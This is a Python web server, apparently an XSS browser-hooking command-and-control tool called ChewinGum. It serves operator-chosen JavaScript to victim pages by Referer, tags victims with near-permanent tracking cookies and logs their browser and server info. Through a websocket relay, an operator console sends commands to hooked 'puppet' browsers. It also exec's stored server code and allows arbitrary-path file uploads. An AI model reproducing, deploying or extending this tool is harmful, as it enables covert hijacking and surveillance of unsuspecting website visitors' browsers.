#! /usr/bin/env python
# encoding=utf-8

import sqlite3
from sys import argv
from cgi import escape
from time import ctime
from hashlib import md5
#from os.path import isfile
#from os import listdir, remove
from data.libdbs import sqlitei
from bottle.ext.websocket import websocket, GeventWebSocketServer
#from beaker.middleware import SessionMiddleware as sessionm
from httplib import HTTPConnection as httpconn
from base64 import b64encode, b64decode
from urlparse import urlparse
from json import dumps, loads
from random import random
from bottle import route, error, get, post,\
	static_file, request, template,\
	response, redirect, abort, run#, app

#	sqlite sqldb
auser = sqlite3.connect('./data/auser.db')
ausers = auser.cursor()
#gum = sqlite3.connect('./data/gum.db')
#gums = gum.cursor()
gum = sqlitei('./data/gum.db')

ausers.execute("select domain, salt from user where id=1")
domain, salt = ausers.fetchone()
'''
#	session
session_opt = {
    'session.type':'file',
    'session.cookie_expires':300,
    'session.data_dir':'./data/session',
    'session.auto':True
}
apps = sessionm(app(), session_opt)
'''
def getmd5(key):
    hashs = md5()
    hashs.update(key)
    return hashs.hexdigest()

def getoken():
    token = getmd5(str(random()) + str(salt))
    response.set_cookie('token', token, path='/home')
    return token

def setheader():
    response.set_header('X-Frame-Options', 'deny')

def validate(types):
    if types == 'login':
        setheader()
        login_key = request.get_cookie('key')
        if login_key:
            ausers.execute("select cookie from user where id=1")
            if login_key in ausers.fetchone():
                return False
    elif types == 'token':
        ctoken = request.get_cookie('token')
        ptoken = request.forms.get('token')
        if ctoken and ptoken and ctoken == ptoken:
            return False
    return True

@get('/static/<filename:path>')
@post('/static/<filename:path>')
def send_static(filename):
    return static_file(filename, root = './static/')

@error(404)
@error(405)
@error(500)
def errors(gumerror):
    setheader()
    return template('errors',
            error = gumerror.status[:3],
            ctime = ctime())

@get('/')
@post('/')
def gumjs():
    projects = None
    response.set_header('Content-Type', 'application/javascript')
    referer = request.headers.get('Referer')
    idsalt = request.get_cookie('gum')
    if idsalt:
        gum.select('object', ['upkey','browser'], {'idsalt':idsalt})
        objects = gum.cs.fetchone()
        if objects:
            return template('index',
                    domain = domain,
                    script = objects[1])
    if referer:
        gum.select('project', ['upkey','browser'], {'referer':referer})
        projects = gum.cs.fetchone()
        if not projects:
            gum.select('project', ['upkey','browser'],
                    {'referer':urlparse(referer).netloc})
            projects = gum.cs.fetchone()
    if not projects:
        gum.select('project', ['browser'], {'referer':'$default'})
        projects = gum.cs.fetchone()
    return template('index',
            domain = domain,
            script = projects[-1] if projects[-1] else '')

@get('/login')
def login():
    return template('login', uri='/login')

@get('/home/rekey')
def rekey():
    if validate('login'):
        abort(404)
    return template('login', uri='/home/rekey')

@post('/login')
@post('/home/rekey')
def login_rekey():
    rekey = None
    referer = str(request.headers.get('Referer'))
    if urlparse(referer).path == '/home/rekey':
        if not validate('login'):
            rekey = True
        else:
            abort(404)
    filekey = request.files.get('filekey')
    urlkey = request.forms.get('urlkey')
    if filekey:
        key = filekey.file.read()
    elif urlkey:
        try:
            keyurl = urlparse(urlkey)
            httpkey = httpconn(keyurl.netloc)
            httpkey.request('GET', keyurl.path)
            key = httpkey.getresponse().read()
        except:
            redirect(referer)
    else:
        redirect(referer)
    ausers.execute("select key from user where id=1")
    keys = getmd5(b64encode(key) + salt)
    akeys = ausers.fetchone()[0]
    if keys != akeys:
        if rekey:
            ausers.execute("update user set key=? where id=1",
                    [keys])
        else:
            redirect(referer)
    else:
        ausers.execute("select id,domain,salt,key from user where id=1")
        keyhash = getmd5(b64encode(str(ausers.fetchone()) + ctime()))
        ausers.execute("update user set cookie=? where id=1", [keyhash])
        response.set_cookie('key', keyhash, httponly = True,
                max_age = 604800, path = '/home')
    auser.commit()
    redirect('/home')

@post('/home/logout')
def logout():
    if validate('login') or validate('token'):
        abort(404)
    if request.forms.get('logout') == 'logout':
        ausers.execute("update user set cookie=? where id=1",
                [None])
        auser.commit()
    redirect('/login')

@route('/home')
def home():
    if validate('login'):
        abort(404)
    gum.select('project', ['id','referer','upkey'])
    projects = gum.cs.fetchall()
    gum.select('object', ['idsalt','name','upkey'])
    objects = gum.cs.fetchall()
    gum.select('project', ['id'], {'upkey':'yes'})
    newid = gum.cs.fetchone()[0]
    return template('home',
            new = newid,
            projects = projects, objects = objects,
            token = getoken())

@post('/home/<ids:int>/setting')
def save_project(ids):
    upkey = gum.select('project', ['upkey'], {'id':ids}).fetchone()
    if validate('login') or validate('token') or not upkey:
        abort(404)
    referer = request.forms.get('referer')
    if not referer:
        return 0
    setserver = str(request.forms.get('server'))
    setbrowser = str(request.forms.get('browser'))
    gum.update('project', {
        'upkey':'no',
        'referer':referer,
        'server':setserver,
        'browser':setbrowser
        }, {'id':ids})
    if upkey[0] == 'yes':
       gum.insert('project', ['upkey'], ['yes'])
    gum.commit()
    redirect(request.headers.get('Referer'))

@route('/home/project/<ids:int>')
def project_edit(ids):
    if validate('login'):
        abort(404)
    projects = gum.select('project', ['*'], {'id':ids}).fetchone()
    if not projects:
        abort(404)
    return template('aim',
            id = ids, state = 0,
            name = projects[2] if projects[2] else '',
            server = projects[4] if projects[4] else '',
            browser = projects[3] if projects[3] else '',
            life = '',
            token = getoken())

@route('/home/object/<idsalt:re:[a-z0-9]+>')
def object_edit(idsalt):
    if validate('login'):
        abort(404)
    objects = gum.select('object', [
        'upkey', 'name', 'browser', 'server', 'life'
        ], {'idsalt':idsalt}).fetchone()
    if not objects or objects[0] == 'yes':
        abort(404)
    infos = gum.select('info', ['id'], {'idsalt':idsalt}).fetchall()
    return template('aim',
            id = objects[1], state = 1,
            name = objects[1],
            browser = objects[2] if objects[2] else '',
            server = objects[3] if objects[3] else '',
            life = objects[4] if objects[4] else 'unknown',
            idsalt = idsalt, infos = infos,
            token = getoken())

@post('/home/<idsalt:re:[a-z0-9]+>/useing')
def save_object(idsalt):
    upkey = gum.select('object', ['upkey'], {'idsalt':idsalt}).fetchone()[0]
    if validate('login') or validate('token')\
            or not upkey or upkey == 'yes':
        abort(404)
    name = request.forms.get('name')
    if not name:
        return False
    server = request.forms.get('server')
    browser = request.forms.get('browser')
    gum.update('object', {
        'name':name,
        'browser':browser,
        'server':server
        },{'idsalt':idsalt})
    gum.commit()
    redirect(request.headers.get('Referer'))

@route('/home/<ids:int>/info')
def seeinfo(ids):
    upkey = gum.select('info', ['upkey'], {'id':ids}).fetchone()[0]
    if validate('login') or not upkey or upkey == 'yes':
        abort(404)
    infos = gum.select('info', [
        'idsalt', 'serverinfo', 'browserinfo'
        ], {'id':ids}).fetchone()
    return template('seeinfo',
            idsalt = infos[0],
            serverinfo = loads(infos[1]),
            browserinfo = loads(infos[2]),
            ids = ids, states = 'info',
            token = getoken())

@post('/home/delete/<state:re:object>/<ids:re:[a-z0-9]+>')
@post('/home/delete/<state:re:project>/<ids:int>')
@post('/home/delete/<state:re:info>/<ids:int>')
def deletes(state, ids):
    if validate('login') or validate('token'):
        abort(404)
    idname = 'idsalt' if (state == 'object') else 'id'
    upkey = gum.select(state, ['upkey'], {idname:ids}).fetchone()
    if upkey and upkey != 'yes':
        if state == 'project' and ids == 1:
            redirect('/home')
        gum.delete(state, {idname:ids})
        gum.commit()
    redirect('/home')

@get('/home/plus')
def plus_list():
    if validate('login'):
        abort(404)
    return template('plus', token=getoken())
#    dirpath = request.query.ls if request.query.ls else './static/'
#    template('plus',lsdir = listdir(dirpath))

@post('/home/plus/up')
def plus_up():
    if validate('login') or validate('token'):
        abort(404)
    upload = request.files.get('plus')
    upload.save(request.forms.get('path') + upload.filename)
    redirect('/home/plus')

@get('/ing')
@post('/ing')
def ing():
    projects = server = updates = None
    serverinfo = {}
    browserinfo = {}
    iferror = returns = ''
    idsalt = request.get_cookie('gum')
    referer = request.headers.get('Referer')
#    sessionid = request.environ.get('beaker.session')
    if idsalt:
        gum.select('object', ['upkey','server'], {'idsalt':idsalt})
        server = gum.cs.fetchone()
        server = (server[1] if server[1] else '') if server else ''
    if server == None:
        if referer:
            projects = gum.select('project', [
                'upkey', 'id', 'server', 'browser'
                ], {'referer':referer}).fetchone()
        if referer and not projects:
            projects = gum.select('project', [
                'upkey', 'id', 'server', 'browser'
                ], {'referer':urlparse(referer).netlog}).fetchone()
        if not referer or not projects:
            projects = gum.select('project', [
                'upkey', 'id', 'server', 'browser'
                ], {'id':1}).fetchone()
        server = setserver = projects[2] if projects[2] else ''
        setbrowser = projects[3] if projects[3] else ''
        setname = str(referer) + '_' + ctime() + '_' + str(projects[1])
        idsalt =  getmd5(str(setname) + str(salt))
        response.set_cookie('gum', idsalt,
                httponly = True, max_age = 946080000)
        gum.update('object', {
            'idsalt':idsalt,
            'name':setname,
            'browser':setbrowser,
            'server':setserver,
            'upkey':'no'
            }, {'upkey':'yes'})
        gum.insert('object', ['upkey'], ['yes'])
#    updates = True if sessionid.get(referer) else False
    if server:
        try:
            exec server
        except Exception, e:
            print 'ConfigError: server code error.'
            print e
            serverinfo['SERVER_CODE_ERROR'] = e
    if not updates:
#        infoid = gums.execute("select id from info where upkey=?",
#                ['yes']).fetchone()[0]
        gum.update('info', {
            'upkey':'no',
            'idsalt':idsalt,
            'serverinfo':dumps(serverinfo),
            'browserinfo':dumps(browserinfo),
            }, {'upkey':'yes'})
        gum.insert('info', ['upkey'], ['yes'])
#        sessionid[referer] = [infoid, browserinfo]
#    else:
#        gums.execute("update info set browserinfo=? where id=?",
#		[dumps(browserinfo), sessionid.get(referer)[0]])
    gum.update('object', {'life':ctime()}, {'idsalt':idsalt})
#    sessionid.save()
    gum.commit()
    if iferror:
        abort(iferror)
    return returns

consoles = {}
puppets = {}
@get('/connect', apply=[websocket])
@get('/home/connect', apply=[websocket])
def connect(ws):
    if not validate('login'):
        lineor = True
        idsalt = request.query.idsalt
    else:
        lineor = False
        idsalt = request.get_cookie('gum')
    upkey = gum.select('object', ['upkey'], {'idsalt':idsalt}).fetchone()[0]
    if not idsalt or not upkey or upkey == 'yes':
        abort(404)
    if lineor:
        consoles[idsalt] = ws
    else:
        puppets[idsalt] = ws
#        gum.update('object', {'life':ctime()}, {'idsalt':idsalt})
#        gum.commit()
    while True:
        try:
            cmdinfo = ws.receive()
        except Exception, e:
            print e
            break
        if cmdinfo is not None:
            try:
                if lineor:
                    puppets[idsalt].send(cmdinfo)
                else:
                    consoles[idsalt].send(escape(cmdinfo))
            except KeyError, e:
                consoles[idsalt].send(
                    escape('No User, {error}'.forma(error=e)))
        else: break
    if lineor:
        del consoles[idsalt]
    else:
        del puppets[idsalt]

@get('/home/console')
def console():
    return template('console', domain=domain)

def main(host, port, debug):
#    run(host=host, port=port, app=apps, debug=debug)
    run(host=host, port=port, debug=debug, server=GeventWebSocketServer)

if __name__ == '__main__':
    if len(argv) <= 1 or ('-h' in argv) or ('--help' in argv):
        print b64decode(b64encode('ChewinGum'))
        print '''
usage:
	python ./chewingum.py [ host port debug | -h ]

	-h --help
'''
    else:
        host = (argv[1] if argv[1] else '0.0.0.0') if len(argv) > 1 else '0.0.0.0'
        port = (argv[2] if argv[2] else '80') if len(argv) > 2 else '80'
        debug = (True) if len(argv) > 3 else False
        main(host, port, debug)
